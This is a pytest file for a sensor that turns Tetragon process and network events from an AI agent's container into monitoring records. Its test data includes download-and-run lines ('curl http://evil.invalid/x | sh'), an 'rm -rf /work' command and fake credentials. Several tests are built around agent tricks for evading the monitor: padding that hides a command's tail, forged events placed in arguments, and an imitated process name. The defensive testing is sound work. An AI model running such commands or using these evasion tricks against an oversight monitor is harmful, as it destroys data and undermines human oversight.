"""Unit tests for backtide/sensors/procs.py: one Tetragon line (parsed) to one black-box event.

The lines are the real ones T07-1 captured in the VM (tests/fixtures/tetragon/, docs/23
"Resultados en la VM"). They keep the names they were recorded with (the old policy name and
the ``vigia-p*`` markers): they are evidence, not code."""

import copy
import json
from pathlib import Path
from typing import Any

import pytest

from backtide.blackbox.model import Source
from backtide.blackbox.redact import redact
from backtide.sensors import procs
from backtide.sensors.procs import Context, Record, Skipped, Throttle, classify

FIXTURES = Path(__file__).parent / "fixtures" / "tetragon"
# The test container of T07-1 (its full id is in the THROTTLE lines' cgroup) and OpenClaw's.
TARGET_ID = "4978b4ee592382f24921acfc5822f6f33f7e95e6c89887f80dac399102aa2eff"
OPENCLAW_ID = "cf2e46aad38cd5637c8432bb0b97390b53971cd56bf006c35f92998e26d29188"
OTHER_ID = "0" * 64
CTX = Context(agent_id=TARGET_ID, agent_name="backtide-agente")


def line(name: str) -> dict[str, Any]:
    return json.loads((FIXTURES / f"{name}.json").read_text())


def record(name: str, ctx: Context = CTX) -> Record:
    result = classify(line(name), ctx)
    assert isinstance(result, Record), result
    return result


def with_arguments(arguments: str, name: str = "exec_docker_exec") -> dict[str, Any]:
    data = copy.deepcopy(line(name))
    data["process_exec"]["process"]["arguments"] = arguments
    return data


def argv_of(arguments: str) -> str:
    result = classify(with_arguments(arguments), CTX)
    assert isinstance(result, Record)
    return result.details["argv"]


# --- exec -----------------------------------------------------------------------------------


def test_an_exec_from_docker_exec_is_recorded_as_injected() -> None:
    rec = record("exec_docker_exec")
    assert (rec.source, rec.action, rec.target, rec.risk) == (Source.EXEC, "exec", "/bin/true", 0)
    assert rec.details == {
        "argv": "vigia-p3-6ea54410b884",
        "cwd": "/app",
        "pid": 1601637,
        "uid": 1000,
        "parent": {"pid": 1601276, "binary": "/usr/bin/containerd-shim-runc-v2"},
        "container": TARGET_ID[:12],
        "container_name": "backtide-agente",
        "injected": True,
        "truncated": False,
        "argv_bytes": len("vigia-p3-6ea54410b884"),
        "t": "2026-10-17T09:45:23.220119379Z",
        "exec_id": "NWEyMGM1OWMyMzgzOjQ2NTcxMjIxMjU1NjAxNzoxNjAxNjM3",
    }


def test_an_exec_of_the_agents_own_tree_is_not_injected() -> None:
    rec = record("exec_init_tree")
    assert rec.target == "/usr/bin/sleep"
    assert rec.details["injected"] is False
    assert rec.details["parent"] == {"pid": 1601300, "binary": "/usr/bin/dash"}


def test_openclaw_at_rest_is_attributed_to_its_own_container() -> None:
    ctx = Context(agent_id=OPENCLAW_ID, agent_name="backtide-agente")
    rec = record("exec_openclaw_at_rest", ctx)
    assert rec.target == "/usr/bin/git"
    assert rec.details["container"] == OPENCLAW_ID[:12]
    assert rec.details["argv"].startswith("-c maintenance.autoDetach=false")
    # ...and the same line is not the test container's.
    assert classify(line("exec_openclaw_at_rest"), CTX) == Skipped("other")


def test_a_field_filtered_exec_still_has_everything_the_event_needs() -> None:
    rec = record("exec_field_filtered")
    assert rec.details["parent"] == {"pid": 1601276, "binary": "/usr/bin/containerd-shim-runc-v2"}
    assert rec.details["injected"] is True
    assert rec.details["argv"] == "vigia-p11f-c59fe99362aa"


def test_processes_from_before_the_sensor_are_only_counted() -> None:
    """Marked, with its start time: the reader only records the ones that began while the
    sensor was down."""
    rec = record("exec_procfs")
    assert rec.preexisting is True
    assert rec.started == "2026-10-17T09:45:21.717563404Z"
    assert rec.details["preexisting"] is True


def test_arguments_lost_by_tetragon_are_marked() -> None:
    """T07-1, P5: past ~320 KiB the exec comes with dataArgs and without arguments."""
    rec = record("exec_arguments_lost")
    assert rec.details["arguments_lost"] is True
    assert rec.details["argv"] == ""
    assert rec.details["cwd"] == "<enomem>"


def test_dataargs_with_its_arguments_is_not_lost_and_is_cut_to_1_kib() -> None:
    rec = record("exec_long_arguments")
    assert "arguments_lost" not in rec.details
    assert rec.details["argv_bytes"] > 90_000
    assert len(rec.details["argv"].encode()) <= procs.ARGV_LIMIT
    assert "bytes in all]…" in rec.details["argv"]  # the cut says so


def test_tetragon_truncation_flags_are_reported() -> None:
    data = line("exec_docker_exec")
    data["process_exec"]["process"]["flags"] = "execve clone truncArgs"
    result = classify(data, CTX)
    assert isinstance(result, Record) and result.details["truncated"] is True


def test_a_runc_init_is_recorded_and_flagged() -> None:
    """Every docker exec starts with runc's own init: recorded (the agent could imitate the
    name), only flagged when its parent really is the containerd shim."""
    data = with_arguments("init")
    data["process_exec"]["process"]["binary"] = "/proc/self/fd/6"
    rec = classify(data, CTX)
    assert isinstance(rec, Record) and rec.details["runc_init"] is True
    data["process_exec"]["parent"]["binary"] = "/usr/bin/python3"
    rec = classify(data, CTX)
    assert isinstance(rec, Record) and "runc_init" not in rec.details


# --- exit -----------------------------------------------------------------------------------


def test_a_normal_exit_is_not_recorded() -> None:
    assert classify(line("exit_normal"), CTX) == Skipped("exit")


def test_an_exit_by_signal_is_recorded() -> None:
    rec = record("exit_signal")
    assert (rec.source, rec.action, rec.target) == (Source.EXEC, "exit", "/usr/bin/sh")
    assert rec.details == {
        "pid": 1601698,
        "signal": "SIGKILL",
        "status": 0,
        "container": TARGET_ID[:12],
        "t": "2026-10-17T09:45:23.869638200Z",
        "exec_id": line("exit_signal")["process_exit"]["process"]["exec_id"],
    }


# --- connect --------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("name", "target", "family", "proto"),
    [
        ("connect_tcp4", "192.0.2.1:24226", "AF_INET", "tcp"),
        ("connect_tcp6", "[2001:db8::1]:24226", "AF_INET6", "tcp"),
        ("connect_udp4", "192.0.2.1:24226", "AF_INET", "udp"),
    ],
)
def test_a_connect_attempt_is_recorded(name: str, target: str, family: str, proto: str) -> None:
    rec = record(name)
    assert (rec.source, rec.action, rec.target, rec.risk) == (Source.NET, "connect", target, 0)
    assert rec.details["family"] == family
    assert rec.details["proto"] == proto
    assert rec.details["port"] == 24226
    assert rec.details["pid"] == 1601976
    assert rec.details["binary"] == "/usr/bin/python3"
    assert rec.details["container"] == TARGET_ID[:12]
    assert rec.details["t"].startswith("2026-10-17T09:45:27.53")


def test_loopback_connects_are_skipped() -> None:
    assert classify(line("connect_loop4"), CTX) == Skipped("loopback")
    ctx = Context(agent_id=OPENCLAW_ID, agent_name="backtide-agente")
    assert classify(line("connect_openclaw_loopback"), ctx) == Skipped("loopback")


def _connect_to(addr: str, port: int, family: str = "AF_INET") -> dict[str, Any]:
    data = copy.deepcopy(line("connect_tcp4"))
    data["process_kprobe"]["args"][1]["sockaddr_arg"] = {
        "family": family,
        "addr": addr,
        "port": port,
    }
    return data


@pytest.mark.parametrize(
    ("addr", "port", "family"),
    [("127.0.0.1", 80, "AF_INET"), ("127.255.0.9", 53, "AF_INET"), ("::1", 443, "AF_INET6")],
)
def test_every_loopback_address_is_skipped(addr: str, port: int, family: str) -> None:
    assert classify(_connect_to(addr, port, family), CTX) == Skipped("loopback")


def test_dockers_dns_is_not_treated_as_loopback() -> None:
    """127.0.0.11:53 is how the agent's name lookups look (docs/23, "Bucle local")."""
    rec = classify(_connect_to("127.0.0.11", 53), CTX)
    assert isinstance(rec, Record) and rec.target == "127.0.0.11:53"
    assert classify(_connect_to("127.0.0.11", 54), CTX) == Skipped("loopback")


@pytest.mark.parametrize("addr", ["not-an-ip", "", "1.2.3.4.5"])
def test_a_connect_with_a_bad_address_is_invalid(addr: str) -> None:
    assert classify(_connect_to(addr, 80), CTX) == Skipped("invalid")


def test_a_connect_of_another_function_is_unknown() -> None:
    data = line("connect_tcp4")
    data["process_kprobe"]["function_name"] = "tcp_connect"
    assert classify(data, CTX) == Skipped("unknown")


# --- throttle ---------------------------------------------------------------------------


def test_throttle_events_of_the_agent_are_gaps() -> None:
    assert classify(line("throttle_start"), CTX) == Throttle(
        "start", "2026-10-17T09:45:40.166022589Z"
    )
    assert classify(line("throttle_stop"), CTX) == Throttle(
        "stop", "2026-10-17T09:45:45.509600984Z"
    )


def test_throttle_events_of_another_container_are_not_the_agents() -> None:
    ctx = Context(agent_id=OPENCLAW_ID, agent_name="backtide-agente")
    assert classify(line("throttle_start"), ctx) == Skipped("other")


# --- attribution ----------------------------------------------------------------------------


def test_attribution_is_by_the_parsed_field_not_by_the_text() -> None:
    """eventos-falsos-en-argv: the agent's id in another container's arguments changes
    nothing, and a JSON event in the agent's arguments is only text."""
    data = line("exec_openclaw_at_rest")
    data["process_exec"]["process"]["arguments"] = f'"docker":"{TARGET_ID[:31]}"'
    assert classify(data, CTX) == Skipped("other")
    fake = json.dumps(line("connect_tcp6"))
    rec = classify(with_arguments(fake), CTX)
    assert isinstance(rec, Record) and rec.action == "exec" and rec.target == "/bin/true"


@pytest.mark.parametrize(
    "docker_field", ["", "4978b4ee592", "4978B4EE592382F2", "zz78b4ee592382f2"]
)
def test_a_short_or_malformed_container_field_is_not_the_agent(docker_field: str) -> None:
    data = line("exec_docker_exec")
    data["process_exec"]["process"]["docker"] = docker_field
    assert classify(data, CTX) == Skipped("other")


def test_a_missing_container_field_is_not_the_agent() -> None:
    data = line("exec_docker_exec")
    del data["process_exec"]["process"]["docker"]
    assert classify(data, CTX) == Skipped("other")


def test_the_context_wants_a_full_container_id() -> None:
    with pytest.raises(ValueError):
        Context(agent_id=TARGET_ID[:31], agent_name="backtide-agente")


@pytest.mark.parametrize(
    "data",
    [
        {},
        {"process_exec": None},
        {"process_exec": {"process": "x"}},
        {"process_exec": {"process": {"docker": TARGET_ID[:31], "pid": "1", "binary": 7}}},
        {"process_kprobe": {"process": {"docker": TARGET_ID[:31]}, "args": "x"}},
        {"process_throttle": {"type": 5, "cgroup": None}},
        {"something_else": {}},
    ],
)
def test_odd_shapes_never_raise(data: dict[str, Any]) -> None:
    assert isinstance(classify(data, CTX), Record | Skipped | Throttle)


# --- probes ---------------------------------------------------------------------------------


def test_a_probe_carries_its_nonce() -> None:
    nonce = procs.new_nonce("hb")
    rec = classify(with_arguments(nonce), CTX)
    assert isinstance(rec, Record) and rec.nonce == nonce


@pytest.mark.parametrize(
    ("binary", "in_init_tree", "arguments"),
    [
        ("/tmp/true", False, None),  # noqa: S108 - a path inside the container
        ("/bin/true", True, None),
        ("/bin/true", False, "backtide-hb-short"),
    ],
)
def test_only_a_true_from_outside_the_tree_is_a_probe(
    binary: str, in_init_tree: bool, arguments: str | None
) -> None:
    data = with_arguments(arguments or procs.new_nonce("hb"))
    data["process_exec"]["process"]["binary"] = binary
    data["process_exec"]["process"]["in_init_tree"] = in_init_tree
    rec = classify(data, CTX)
    assert isinstance(rec, Record) and rec.nonce is None


# --- what is never kept (docs/23, section 5) ----------------------------------------------

# Fake secrets only, each in a form an agent's command line uses.
FAKE = {
    "bearer": "fakeBearerToken0123456789abcdef",
    "x_api_key": "fakeXApiKey0123456789abcdef",
    "password_flag": "hunter2-fake-flag",
    "password_eq": "hunter2-fake-equals",
    "password_quoted": "two fake words",
    "token_flag": "fake-token-flag-0123",
    "client_secret": "fake-client-secret-0123",
    "env_key": "fakeEnvApiKey0123456789",
    "url_password": "fakeurlpassword",
    "curl_user": "fakecurlpassword",
    "sk": "sk-fakeabcdefghijklmnopqrstuv0123",
    "ghp": "ghp_fakeabcdefghijklmnopqrstuvwxyz",
    "akia": "AKIAFAKEABCDE0123456",
    "telegram": "123456789:AAFakeTelegramTokenabcdefghijklmnop",
    "cookie": "fakecookievalue0123",
    "pem": "MIIEfakePEMbodyfakePEMbody0123456789",
    "json_key": "fakeJsonApiKey0123",
    "py_password": "fake python password",
    "pass_flag": "fake-pass-flag-0123",
    "auth_flag": "fake-auth-flag-0123",
}

CATALOG = [
    f'-H "Authorization: Bearer {FAKE["bearer"]}" https://api.example.invalid/',
    f'-H "x-api-key: {FAKE["x_api_key"]}"',
    f"--password {FAKE['password_flag']}",
    f"--password={FAKE['password_eq']}",
    f'--password "{FAKE["password_quoted"]}"',
    f"--token {FAKE['token_flag']}",
    f"--client-secret {FAKE['client_secret']}",
    f"OPENAI_API_KEY={FAKE['env_key']} node agent.js",
    f"clone https://someone:{FAKE['url_password']}@example.invalid/repo.git",
    f"-u someone:{FAKE['curl_user']} https://example.invalid/",
    f"{FAKE['sk']} {FAKE['ghp']} {FAKE['akia']}",
    f"https://api.telegram.org/bot{FAKE['telegram']}/getMe",
    f'-H "Cookie: session={FAKE["cookie"]}"',
    f'-c "-----BEGIN RSA PRIVATE KEY-----\n{FAKE["pem"]}\n-----END RSA PRIVATE KEY-----"',
    f"-c \"requests.post(u, json={{'api_key': '{FAKE['json_key']}'}})\"",
    f"-c \"password = '{FAKE['py_password']}'\nlogin(password)\"",
    f"--pass {FAKE['pass_flag']} --auth={FAKE['auth_flag']}",
]


@pytest.mark.parametrize("arguments", CATALOG)
def test_no_fake_secret_reaches_the_event(arguments: str) -> None:
    rec = classify(with_arguments(arguments), CTX)
    assert isinstance(rec, Record)
    for stored in (json.dumps(rec.details), json.dumps(redact(rec.details))):
        leaked = [name for name, value in FAKE.items() if value in stored]
        assert not leaked, stored


def test_secrets_in_the_binary_and_cwd_are_struck_too() -> None:
    data = with_arguments("x")
    data["process_exec"]["process"]["binary"] = f"/tmp/{FAKE['sk']}"  # noqa: S108
    data["process_exec"]["process"]["cwd"] = f"/work/{FAKE['ghp']}"
    rec = classify(data, CTX)
    assert isinstance(rec, Record)
    assert FAKE["sk"] not in rec.target
    assert FAKE["ghp"] not in rec.details["cwd"]


def test_the_scrub_hook_strikes_known_secrets() -> None:
    known = "backtide-fake-anthropic-0123456789abcdef0123456789ab"
    ctx = Context(
        agent_id=TARGET_ID,
        agent_name="backtide-agente",
        scrub=lambda text: text.replace(known, "[REDACTED]"),
    )
    rec = classify(with_arguments(f"say {known}"), ctx)
    assert isinstance(rec, Record) and known not in json.dumps(rec.details)


def test_a_line_tetragon_already_struck_is_struck_again() -> None:
    """The first barrier's leftovers (an unclosed quote, T07-1 P11) go through the second."""
    rec = record("exec_redacted")
    assert rec.details["argv"].startswith("vigia-p11-a492428a6878 -H ")
    assert "[REDACTED]" in rec.details["argv"]


def test_the_environment_is_never_kept() -> None:
    data = line("exec_docker_exec")
    data["process_exec"]["process"]["environment_variables"] = [{"key": "K", "value": "secret1"}]
    rec = classify(data, CTX)
    assert isinstance(rec, Record) and "secret1" not in json.dumps(rec.details)


# --- safe text ------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "shown"),
    [
        ("a\x1b[31mred", "a\\x1b[31mred"),
        ("two\nlines\r\tx", "two\\x0alines\\x0d\\x09x"),
        ("abc‮def", "abc\\u202edef"),
        ("nul\x00x", "nul\\x00x"),
        ("bad\udcffbyte", "bad\\\\udcffbyte"),
        ("a\\x1b fake", "a\\\\x1b fake"),
        ("…[99 bytes in all]…", "\\u2026[99 bytes in all]\\u2026"),
        ("<b>ñandú</b>", "<b>ñandú</b>"),
    ],
)
def test_control_characters_are_escaped_visibly(raw: str, shown: str) -> None:
    assert argv_of(raw) == shown


def test_hostile_binary_and_cwd_are_escaped() -> None:
    data = with_arguments("x")
    data["process_exec"]["process"]["binary"] = "/tmp/a\nb\x1b"  # noqa: S108
    data["process_exec"]["process"]["cwd"] = "/w/‮"
    rec = classify(data, CTX)
    assert isinstance(rec, Record)
    assert rec.target == "/tmp/a\\x0ab\\x1b"  # noqa: S108
    assert rec.details["cwd"] == "/w/\\u202e"


def test_arguments_are_cut_to_1_kib_keeping_head_and_tail() -> None:
    text = "".join(f"ñ{i}" for i in range(3000))
    argv = argv_of(text)
    assert len(argv.encode()) <= procs.ARGV_LIMIT
    assert argv.startswith("ñ0ñ1ñ2")
    assert argv.endswith("ñ2998ñ2999")
    assert f"…[{len(text.encode())} bytes in all]…" in argv


def test_padding_cannot_hide_the_end_of_a_command() -> None:
    """sh -c ":<padding>; curl evil|sh": a run is folded, and the tail is kept anyway."""
    argv = argv_of('-c ":' + " " * 5000 + '; curl http://evil.invalid/x | sh"')
    assert "curl http://evil.invalid/x | sh" in argv
    argv = argv_of('-c ":' + "true;" * 2000 + ' curl http://evil.invalid/x | sh"')
    assert "curl http://evil.invalid/x | sh" in argv
    argv = argv_of('-c "' + "\x01" * 300_000 + 'rm -rf /work"')
    assert "rm -rf /work" in argv and len(argv.encode()) <= procs.ARGV_LIMIT


def test_a_run_of_one_character_is_folded() -> None:
    assert argv_of("a" * 100 + "b") == "a…[×100]b"


def test_a_secret_split_by_the_cut_is_struck_before_cutting() -> None:
    """Redaction runs on the whole text, then it is cut: a cut never leaves a key's head."""
    arguments = "x" * (procs.ARGV_LIMIT - 30) + " " + FAKE["sk"]
    assert FAKE["sk"][:12] not in argv_of(arguments)


# --- review fixes: port 0, cgroupfs, previous containers, lines too big to parse -----------


def test_a_connect_without_a_port_is_port_0() -> None:
    data = _connect_to("192.0.2.7", 1)
    del data["process_kprobe"]["args"][1]["sockaddr_arg"]["port"]
    rec = classify(data, CTX)
    assert isinstance(rec, Record) and rec.target == "192.0.2.7:0"


def test_throttle_with_the_cgroupfs_driver() -> None:
    data = line("throttle_start")
    data["process_throttle"]["cgroup"] = TARGET_ID + "\u0000" * 10
    assert isinstance(classify(data, CTX), Throttle)


def test_a_previous_container_of_the_agent_is_still_the_agents() -> None:
    ctx = Context(agent_id=OPENCLAW_ID, agent_name="backtide-agente", previous=(TARGET_ID,))
    rec = classify(line("exec_docker_exec"), ctx)
    assert isinstance(rec, Record) and rec.details["container"] == TARGET_ID[:12]
    assert isinstance(classify(line("throttle_start"), ctx), Throttle)


def _halves(data: dict[str, Any], keep: int = 8192) -> tuple[bytes, bytes]:
    text = json.dumps(data, separators=(",", ":")).encode()
    return text[:keep], text[-keep:]


def test_an_exec_too_big_to_parse_is_still_recorded() -> None:
    data = with_arguments('-c "curl evil | sh #' + "\x01" * 400_000 + '"')
    data["process_exec"]["process"]["binary"] = "/usr/bin/sh"
    head, tail = _halves(data)
    rec = procs.classify_oversize(head, tail, CTX)
    assert isinstance(rec, Record)
    assert (rec.action, rec.target) == ("exec", "/usr/bin/sh")
    assert rec.details["oversize"] is True and rec.details["arguments_lost"] is True
    assert rec.details["container"] == TARGET_ID[:12]
    assert rec.details["pid"] == 1601637
    assert rec.details["injected"] is True
    assert rec.details["t"] == "2026-10-17T09:45:23.220119379Z"


def test_a_connect_too_big_to_parse_is_still_recorded() -> None:
    data = copy.deepcopy(line("connect_tcp4"))
    data["process_kprobe"]["process"]["arguments"] = "y" * 100_000
    head, tail = _halves(data)
    rec = procs.classify_oversize(head, tail, CTX)
    assert isinstance(rec, Record) and rec.target == "192.0.2.1:24226"
    assert rec.details["oversize"] is True


def test_a_huge_line_of_another_container_is_not_the_agents() -> None:
    data = copy.deepcopy(line("exec_openclaw_at_rest"))
    data["process_exec"]["process"]["arguments"] = f'"docker":"{TARGET_ID[:31]}"' * 2000
    head, tail = _halves(data)
    assert procs.classify_oversize(head, tail, CTX) == Skipped("other")


def test_garbage_too_big_to_parse_is_invalid() -> None:
    assert procs.classify_oversize(b"x" * 100, TARGET_ID.encode(), CTX) == Skipped("invalid")


# --- the key that spots a line read twice (T07-3) ---------------------------------------------


def test_each_kind_has_a_key_made_of_tetragons_exec_id() -> None:
    """A kill -9 of the service reads again the lines after the last saved cursor: the key,
    kept in the event's details, is how the reader knows it recorded them already."""
    exec_rec = record("exec_docker_exec")
    assert exec_rec.key == "exec:NWEyMGM1OWMyMzgzOjQ2NTcxMjIxMjU1NjAxNzoxNjAxNjM3"
    exit_rec = record("exit_signal")
    assert exit_rec.key == f"exit:{exit_rec.details['exec_id']}"
    connect = record("connect_tcp4")
    exec_id = line("connect_tcp4")["process_kprobe"]["process"]["exec_id"]
    assert connect.details["exec_id"] == exec_id
    assert connect.key == f"connect:{exec_id}:{connect.details['t']}"
    for rec in (exec_rec, exit_rec, connect):
        assert procs.event_key(rec.action, rec.details) == rec.key


@pytest.mark.parametrize("exec_id", [None, "", 7, "has spaces", "x" * 200, "<script>"])
def test_without_a_usable_exec_id_there_is_no_key(exec_id: object) -> None:
    data = line("exec_docker_exec")
    data["process_exec"]["process"]["exec_id"] = exec_id
    rec = classify(data, CTX)
    assert isinstance(rec, Record)
    assert rec.key is None and rec.details["exec_id"] is None
    assert procs.event_key("exec", rec.details) is None


def test_event_key_ignores_what_is_not_a_sensor_event() -> None:
    assert procs.event_key("summary", {"exec_id": "abc"}) is None
    assert procs.event_key("exec", {"exec_id": ["abc"]}) is None
    assert procs.event_key("connect", {"exec_id": "abcdefgh", "t": 5}) is None
    assert procs.event_key("exec", "not details") is None  # type: ignore[arg-type]
